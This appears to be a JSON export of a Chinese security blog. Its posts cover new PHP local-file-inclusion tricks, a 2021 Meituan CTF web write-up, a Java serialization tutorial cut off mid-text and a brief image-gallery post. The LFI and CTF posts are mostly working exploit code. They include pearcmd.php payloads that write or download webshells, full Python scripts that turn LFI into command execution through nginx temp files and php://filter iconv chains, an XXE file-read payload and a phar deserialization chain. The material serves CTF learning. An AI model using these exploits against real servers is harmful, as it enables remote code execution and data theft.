[{"content":"Hugo theme Stack supports the creation of interactive image galleries using Markdown. It\u0026rsquo;s powered by PhotoSwipe and its syntax was inspired by Typlog.\nTo use this feature, the image must be in the same directory as the Markdown file, as it uses Hugo\u0026rsquo;s page bundle feature to read the dimensions of the image. External images are not supported.\nSyntax 1 ![Image 1](1.jpg) ![Image 2](2.jpg) Result Photo by mymind and Luke Chesser on Unsplash\n","date":"2023-08-26T00:00:00Z","image":"https://k1te.cn/p/image-gallery/2_hubce42636ecacc1a380b462f3110efcec_37455_120x120_fill_q75_box_smart1.jpg","permalink":"https://k1te.cn/p/image-gallery/","title":"Image gallery"},{"content":"前几天p牛在星球里分享了新的LFI技巧，刚好考完试了过来学习一下\npearcmd.php config-create 这个并不是上面说的新trick，而是p牛十一月份就发了的：Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)，当时十一月份湖湘杯我们还在辛苦地session文件包含，结束后发现大家都是用pearcmd.php，只能说多学习。具体原理参考上面p牛的文章，这里就单纯做个记录方便自己查阅\n这里使用的是2021湖湘杯easywill，如果仿照p牛的payload，那么最终的payload如下：\n1 ?+config-create+/\u0026amp;name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;/\u0026lt;?=phpinfo()?\u0026gt;+/tmp/hello.php (注意，请使用burp发包，否则尖括号会被url编码，此处只是演示)\n可以看到我们的name和value变量成功传入，同时$_SERVER['argv']也成功解析，需要注意的是config-create必须在$_SERVER['argv']数组的第二个位置，然后后面两个参数紧随其后，否则会报错，所以config-create前面还有一个+号，使得第0个元素为空，这个应该是php源码的处理，这里就没有再往下跟了。\n综上，我们还可以将payload改成：\n1 /?name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;+config-create+/\u0026lt;?=phpinfo()?\u0026gt;+/tmp/hello.php 可以实现同样的效果\ninstall 在学习p牛文章的过程中找到了bfengj师傅的一篇文章：利用pearcmd.php从LFI到getshell，里面介绍了pear的另一个利用方法：\n1 pear install -R /tmp http://xxxxxxx/shell.php 这个方法可以直接把我们的webshell下载到靶机从而实现RCE\n回到我们easywill的环境，payload：\n1 url?name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;+install+-R+/tmp+http://ip:port/info.php 同时，在这片文章中还学到了config-create的另一个用法：\n我们可以使用pear -c file -d foo=bar -s达到同样的写配置文件的目的，在easywill中的payload如下：\n1 /?name=cfile\u0026amp;value=/usr/local/lib/php/pearcmd.php\u0026amp;+-c+/tmp/shell.php+-d+man_dir=\u0026lt;?eval($_POST[0]);?\u0026gt;+-s+ 最后一个+号好像没有也可以。\n限制 今天早上写的时候刚好在p牛的星球看到Smity师傅发的文章，大概意思是php官方的镜像确实如p牛所说，但是如果是使用apt install php下载的php（据该师傅所言，大多数ctf docker的制作方式都是这个），那么这个环境就和P牛所说的环境有两个不同：\npearcmd.php在/usr/share/php/pearcmd.php register_argc_argv在php.ini中默认关闭 如果说第一个还可以调整，那么第二个限制则是致命的。\n可能是我的运气比较好，也可能是我比较懒，easywill的环境我刚好是根据php官方镜像搭建的，所以没踩到这个坑。\n利用 Nginx 产生临时文件 这个技巧来源于hxp2021，不过我并没有打这个比赛，而是如开头所说通过p牛的星球了解到的，看了Zeddy大佬的文章只能说叹为观止。\n总结起来整个过程就是：\n让后端 php 请求一个过大的文件 Fastcgi 返回响应包过大，导致 Nginx 需要产生临时文件进行缓存 虽然 Nginx 删除了/var/lib/nginx/fastcgi下的临时文件，但是在 /proc/pid/fd/ 下我们可以找到被删除的文件 遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI 这里直接用出题人的exp改了一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 #!/usr/bin/env python3 import sys, threading, requests # exploit PHP local file inclusion (LFI) via nginx\u0026#39;s client body buffering assistance # see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details URL = f\u0026#39;http://{sys.argv[1]}:{sys.argv[2]}/index.php\u0026#39; # find nginx worker processes r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: \u0026#39;/proc/cpuinfo\u0026#39; }) cpus = r.text.count(\u0026#39;processor\u0026#39;) r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: \u0026#39;/proc/sys/kernel/pid_max\u0026#39; }) pid_max = int(r.text) print(f\u0026#39;[*] cpus: {cpus}; pid_max: {pid_max}\u0026#39;) nginx_workers = [] for pid in range(pid_max): r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: f\u0026#39;/proc/{pid}/cmdline\u0026#39; }) if b\u0026#39;nginx: worker process\u0026#39; in r.content: print(f\u0026#39;[*] nginx worker found: {pid}\u0026#39;) nginx_workers.append(pid) if len(nginx_workers) \u0026gt;= cpus: break done = False # upload a big client body to force nginx to create a /var/lib/nginx/body/$X def uploader(): print(\u0026#39;[+] starting uploader\u0026#39;) while not done: requests.get(URL, data=\u0026#39;\u0026lt;?php system($_GET[\u0026#34;c\u0026#34;]); /*\u0026#39; + 16*1024*\u0026#39;A\u0026#39;) for _ in range(16): t = threading.Thread(target=uploader) t.start() # brute force nginx\u0026#39;s fds to include body files via procfs # use ../../ to bypass include\u0026#39;s readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)` def bruter(pid): global done while not done: print(f\u0026#39;[+] brute loop restarted: {pid}\u0026#39;) for fd in range(4, 32): f = f\u0026#39;/proc/self/fd/{pid}/../../../{pid}/fd/{fd}\u0026#39; r = requests.get(URL, params={ \u0026#39;name\u0026#39;: \u0026#39;cfile\u0026#39;, \u0026#39;value\u0026#39;: f, \u0026#39;c\u0026#39;: f\u0026#39;id\u0026#39; }) if \u0026#39;uid\u0026#39; in r.text: print(f\u0026#39;[!] {f}: {r.text}\u0026#39;) done = True exit() for pid in nginx_workers: a = threading.Thread(target=bruter, args=(pid, )) a.start() 原本是直接拿php官方镜像搭的的环境，结果发现官方镜像只有php-apache，没有nginx，然后自己又搭了一会儿nginx，以及刚开始跑脚本跑出来了log，应该是willphp框架打开的log，后面加了“uid”的判断条件就能正常把id跑出来了\n使用php://filter将任意文件转换成Webshell 这个来源于hxp2021的另一题counter，国外一个大佬的非预期解法：https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d\n这里主要参考Zeddy师傅的文章，看之前已经大概知道了这个trick的思路，当时已经十分震惊了，但是当我看到文章里令人眼花缭乱的字符集转换，最后转换出了webshell，再一次被震撼到了，真的太牛了\n主要的思路就是利用php伪协议的转换过滤器，通过字符集转换来生成特定的内容，同时利用base64“宽松的解析”（当需要解析的字符串中含有base64表中不存在的字符时，不会报错，而是将其丢弃并继续解析），将其中不可见的字符丢掉，只剩下我们想要的结果。\n读完上面这段话我们就会发现，如何利用字符集转换生成我们想要的内容（filter chain的寻找）其实是这个trick的核心部分，Zeddy的文章中有讲到该如何fuzz，同时wupco师傅也给出了现成的结果以及fuzz脚本：https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT\n这里回到我们的easywill，稍微修改一下国外大佬的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import requests url = \u0026#34;http://ip:port/index.php\u0026#34; file_to_use = \u0026#34;/etc/passwd\u0026#34; command = \u0026#34;id\u0026#34; #\u0026lt;?=`$_GET[0]`;;?\u0026gt; base64_payload = \u0026#34;PD89YCRfR0VUWzBdYDs7Pz4\u0026#34; conversions = { \u0026#39;R\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS\u0026#39;, \u0026#39;U\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;P\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213\u0026#39;, \u0026#39;V\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;Y\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2\u0026#39;, \u0026#39;W\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;D\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39; } # generate some garbage base64 filters = \u0026#34;convert.iconv.UTF8.CSISO2022KR|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # make sure to get rid of any equal signs in both the string we just generated and the rest of the file filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; for c in base64_payload[::-1]: filters += conversions[c] + \u0026#34;|\u0026#34; # decode and reencode to get rid of everything that isn\u0026#39;t valid base64 filters += \u0026#34;convert.base64-decode|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # get rid of equal signs filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; filters += \u0026#34;convert.base64-decode\u0026#34; final_payload = f\u0026#34;php://filter/{filters}/resource={file_to_use}\u0026#34; r = requests.get(url, params={ \u0026#34;0\u0026#34;: command, \u0026#34;name\u0026#34;: \u0026#34;cfile\u0026#34;, \u0026#34;value\u0026#34;: final_payload }) print(r.text) 限制 这个trick的限制无论是上午Smity师傅的文章还是Zeddy师傅的文章下面的评论都有提到过，就是某些字符集在某些系统并不支持，比如Ubuntu18.04，十分幸运，php官方带apache的镜像是Debain，运行上面的脚本没有任何问题，这里猜测hxp2021的出题人用的也是同一个镜像（xs）\n解决的办法其实并不难，只需要将新的字符集放到wupco师傅的脚本中再跑一次就可以了，这里直接使用Smity师傅下午新发的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import requests #参数file url = \u0026#34;http://192.168.190.191/index.php\u0026#34; file_to_use = \u0026#34;index\u0026#34; command = \u0026#34;whoami\u0026#34; #\u0026lt;?=`$_GET[0]`;;?\u0026gt; base64_payload = \u0026#34;PD89YCRfR0VUWzBdYDs7Pz4\u0026#34; conversions = { \u0026#39;R\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937\u0026#39;, \u0026#39;U\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;P\u0026#39;: \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB\u0026#39;, \u0026#39;V\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;Y\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2\u0026#39;, \u0026#39;W\u0026#39;: \u0026#39;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;D\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39; } # generate some garbage base64 filters = \u0026#34;convert.iconv.UTF8.CSISO2022KR|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # make sure to get rid of any equal signs in both the string we just generated and the rest of the file filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; for c in base64_payload[::-1]: filters += conversions[c] + \u0026#34;|\u0026#34; # decode and reencode to get rid of everything that isn\u0026#39;t valid base64 filters += \u0026#34;convert.base64-decode|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # get rid of equal signs filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; filters += \u0026#34;convert.base64-decode\u0026#34; final_payload = f\u0026#34;php://filter/{filters}/resource={file_to_use}\u0026#34; print(final_payload) r = requests.get(url, params={ \u0026#34;0\u0026#34;: command, #\u0026#34;action\u0026#34;: \u0026#34;include\u0026#34;, \u0026#34;file\u0026#34;: final_payload }) print(r.text) 使用compress.zlib://生成临时文件 这个是2019年hxp36c3ctf里面includer的预期解（hxp也太爱LFI了吧），对其他师傅们来说好像不是新姿势了，不过我是通过includer's revenge以及师傅们的文章才知道有这个方法（有递归复习内味了）\n这里还是学习Zeddy师傅的文章，除此之外还有balsn队伍的writeup，大概的意思就是通过对php-src源代码的分析，发现可以使用compress.zip://流上传任意文件（compress.zip://http或者compress.zip://ftp，前提是开启allow_url_include），在此过程中会生成临时文件，然后再经过一系列操作之后绕过WAF并且保存临时文件，最终实现RCE\n最后看下来好像这个方法并没有特别的惊艳，特别是需要开启allow_url_include，而这个配置php默认是关闭的。\n因为这个方法需要搭配特定的配置（nginx配置漏洞导致目录遍历）以及WAF（过滤\u0026lt;?），所以就没有折腾我们可怜的willphp进行复现了。\n最后 全篇文章没写什么深入的东西，因为确实没办法写的比上面那些师傅更好，只是单纯做个记录方便自己查阅吧，感兴趣的师傅可以点开其他师傅的文章深入学习。\n参考 Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)\n利用pearcmd.php从LFI到getshell_feng的博客-CSDN博客\nhxp CTF 2021 - A New Novel LFI - 跳跳糖 (tttang.com)\n0xbb - PHP LFI with Nginx Assistance (bierbaumer.net)\nhxp CTF 2021 - The End Of LFI? - 跳跳糖 (tttang.com)\nSolving \u0026ldquo;includer\u0026rsquo;s revenge\u0026rdquo; from hxp ctf 2021 without controlling any files (github.com)\nGitHub - wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT\n36c3 Web 学习记录 (zeddyu.info)\n","date":"2022-01-10T10:10:38+08:00","permalink":"https://k1te.cn/p/lfi-%E6%96%B0%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/","title":"LFI 新姿势学习"},{"content":"跟着队友学到了不少东西\nHackMe 随便上传一个东西显示“HACK! I filtered all the characters.”，尝试上传一个a，发现可以，上传aa不行，上传a a可以，猜测是字符不能连在一起，可以用utf-16绕过，随便拿个jsp马转成utf-16即可：\n然后上传成功之后会显示一个地址upload/1b5337d0c8ad813197b506146d8d503d/yyyyMMddhhmmssSSS.jsp，后面hint出来才知道这个yyyyMMddhhmmssSSS是上传时的时间戳，最后的SSS是毫秒，我们可以简单写个脚本来爆：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from os import name import requests import time import sys import threading def func(fname): res = requests.get(fname) if \u0026#34;Something went wrong\u0026#34; not in res.text: print(fname) sys.exit(0) url = \u0026#34;http://127.0.0.1:49154\u0026#34; file = \u0026#34;shell.jsp\u0026#34; files = {\u0026#34;file\u0026#34;: open(file, \u0026#34;rb\u0026#34;)} prev = time.strftime(\u0026#34;%Y%m%d%H%M%S\u0026#34;, time.localtime()) # prev = \u0026#34;20211212172308\u0026#34; print(prev) res = requests.post(url + \u0026#34;/UploadServlet\u0026#34;, files=files) # print(res.text) start = time.strftime(\u0026#34;%Y%m%d%H%M%S\u0026#34;, time.localtime()) print(start) for i in range(5): for j in range(1000): fname = f\u0026#34;{url}/page.jsp?file=upload/1b5337d0c8ad813197b506146d8d503d/{int(prev) + i}{str(j).zfill(3)}\u0026#34; # print(fname) thread = threading.Thread(target=func, args=(fname,)) thread.start() UpStorage 登录的时候抓包，发现传的是xml，直接xxe读源码：\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE convert [ \u0026lt;!ENTITY file SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=class.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;file;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;dfsaa\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 文件上传+LFI+class，很容易想到Phar反序列化，exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 \u0026lt;?php //error_reporting(0); //$dbaddr = \u0026#34;127.0.0.1\u0026#34;; //$dbuser = \u0026#34;root\u0026#34;; //$dbpass = \u0026#34;\u0026#34;; //$dbname = \u0026#34;ctf\u0026#34;; //$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname); abstract class Users { public $db; abstract public function verify_user($username, $password); abstract public function check_user_exist($username); abstract public function add_user($username, $password); abstract protected function eval(); public function test() { $this-\u0026gt;eval(); } } class User extends Users { public $db; private $func; protected $param; public function __construct() { $this-\u0026gt;func = \u0026#34;call_user_func\u0026#34;; $this-\u0026gt;param = array(\u0026#34;Logs\u0026#34;,\u0026#34;log\u0026#34;); } protected function eval() { if (is_array($this-\u0026gt;param)) { ($this-\u0026gt;func)($this-\u0026gt;param); } else { die(\u0026#34;no!\u0026#34;); } } public function verify_user($username, $password) { // TODO: Implement verify_user() method. } public function check_user_exist($username) { // TODO: Implement check_user_exist() method. } public function add_user($username, $password) { // TODO: Implement add_user() method. } } class Welcome{ public $file; public $username; public $password; public $verify; public $greeting; public function __construct($username) { $this-\u0026gt;username = $username; $this-\u0026gt;password = \u0026#34;index.php\u0026#34;; } public function __toString(){ return $this-\u0026gt;verify-\u0026gt;verify_user($this-\u0026gt;username,$this-\u0026gt;password); } public function __wakeup(){ $this-\u0026gt;greeting = \u0026#34;Welcome \u0026#34;.$this-\u0026gt;username.\u0026#34;:)\u0026#34;; } } class File { public $filename; public $fileext; public $basename; public function __construct() { $this-\u0026gt;filename = new User(); } public function check_file_exist($filename) { if (file_exists($filename) \u0026amp;\u0026amp; !is_dir($filename)) { return true; } else { return false; } } public function __call($func, $params) { foreach($params as $param){ if($this-\u0026gt;check_file_exist($param)) { $this-\u0026gt;filename-\u0026gt;test(); } } } } class Logs { public $log; public function log() { $log = $_GET[\u0026#39;log\u0026#39;]; if(preg_match(\u0026#34;/rot13|base|toupper|encode|decode|convert|bzip2/i\u0026#34;, $log)) { die(\u0026#34;hack!\u0026#34;); } file_put_contents($log,\u0026#39;\u0026lt;?php exit();\u0026#39;.$log); } } $welcome1 = new Welcome(\u0026#34;index.php\u0026#34;); $welcome1-\u0026gt;verify = new File(); $welcome2 = new Welcome($welcome1); @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub $phar-\u0026gt;setMetadata($welcome2); //将自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件 //签名自动计算 $phar-\u0026gt;stopBuffering(); log处的死亡exit绕过可以参考2020WMCTF的checkin，payload：php://filter/zlib.deflate|string.tolower|zlib.inflate|?\u0026gt;\u0026lt;?php%0deval($_GET[1]);?\u0026gt;/resource=shell.php ","date":"2021-12-13T15:51:24+08:00","permalink":"https://k1te.cn/p/2021%E7%BE%8E%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%83%A8%E5%88%86wp/","title":"2021美团网络安全高校挑战赛web部分wp"},{"content":"Java入门的简单基础，包括序列化反序列化、反射、类的动态加载，动态代理暂时还没用到，后面用到再加上。\n序列化和反序列化 Java序列化是指把Java对象转换为字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。\n用处 想把内存中的对象保存到一个文件中或者数据库中时候； 想用套接字在网络上传送对象的时候； 想通过RMI传输对象的时候 实现 只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常）\n通过 ObjectOutStream 包装 FileOutStream或者ByteArrayInputStream\n同理，可以通过 ObjectInputStream 将数据从磁盘 FileInputStream 或者内存 ByteArrayInputStream 读取出来然后转化为指定的对象\nObjectOutputStream代表对象输出流：\n它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。 ObjectInputStream代表对象输入流：\n它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 例子 Person.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class Person implements Serializable { private String name; private int age; public Person(){} public Person(String name, int age) { this.name = name; this.age = age; } @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } SerializeTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 public class SerializeTest { public static void serialize(Object obj) throws IOException{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;person.ser\u0026#34;)); objectOutputStream.writeObject(obj); } public static void main(String[] args) throws IOException { Person person = new Person(\u0026#34;a\u0026#34;,22); // System.out.println(person); serialize(person); } } Unserialize.java\n1 2 3 4 5 6 7 8 9 10 11 12 public class UnserializeTest { public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename)); Object obj = objectInputStream.readObject(); return obj; } public static void main(String[] args) throws IOException, ClassNotFoundException { Person person = (Person) unserialize(\u0026#34;person.ser\u0026#34;); System.out.println(person); } } 其他需要注意的点 静态成员变量是不能被序列化 transient 标识的对象成员变量不参与序列化 重写writeObject和readObject方法 使用transient关键字阻止序列化虽然简单方便，但被它修饰的属性被完全隔离在序列化机制之外，导致了在反序列化时无法获取该属性的值，而通过在需要序列化的对象的Java类里加入writeObject()方法与readObject()方法可以控制如何序列化各属性，甚至完全不序列化某些属性或者加密序列化某些属性。\nexample:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 public class MyList implements Serializable { private String name; /* transient 表示该成员 arr 不需要被序列化 */ private transient Object[] arr; public MyList() { } public MyList(String name) { this.name = name; this.arr = new Object[100]; /* 给前面30个元素进行初始化 */ for (int i = 0; i \u0026lt; 30; i++) { this.arr[i] = i; } } @Override public String toString() { return \u0026#34;MyList{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, arr=\u0026#34; + Arrays.toString(arr) + \u0026#39;}\u0026#39;; } //-------------------------- 自定义序列化反序列化 arr 元素 ------------------ /** * Save the state of the \u0026lt;tt\u0026gt;ArrayList\u0026lt;/tt\u0026gt; instance to a stream (that * is, serialize it). * * @serialData The length of the array backing the \u0026lt;tt\u0026gt;ArrayList\u0026lt;/tt\u0026gt; * instance is emitted (int), followed by all of its elements * (each an \u0026lt;tt\u0026gt;Object\u0026lt;/tt\u0026gt;) in the proper order. */ private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException { //执行 JVM 默认的序列化操作 s.defaultWriteObject(); //手动序列化 arr 前面30个元素 for (int i = 0; i \u0026lt; 30; i++) { s.writeObject(arr[i]); } } /** * Reconstitute the 